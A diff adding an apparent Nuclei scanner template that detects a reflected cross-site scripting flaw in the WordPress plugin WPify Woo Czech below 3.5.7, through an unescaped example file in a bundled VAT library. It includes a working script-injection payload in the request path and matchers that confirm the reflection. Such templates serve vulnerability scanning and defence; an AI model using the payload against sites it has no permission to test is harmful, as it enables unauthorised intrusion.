@@ -1,0 +1,35 @@
+id: wpify-woo-czech-xss
+
+info:
+  name: WPify Woo Czech < 3.5.7 - Cross-Site Scripting
+  author: Akincibor
+  severity: medium
+  description: The plugin uses the Vies library v2.2.0, which has a sample file outputting $_SERVER['PHP_SELF'] in an attribute without being escaped first, leading to a Reflected Cross-Site Scripting. The issue is only exploitable when the web server has the PDO driver installed, and write access to the example directory (otherwise an exception will be raised before the payload is output)..
+  reference:
+    - https://wpscan.com/vulnerability/5c66c32b-22f2-4b59-a6b2-b8da944cdc3c
+  metadata:
+    verified: true
+  tags: wp,wordpress,xss,wp-plugin,wpify,wpscan
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/"><script>alert(document.domain)</script>'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"><script>alert(document.domain)</script>'
+          - 'Add a new VAT ID to the queue'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
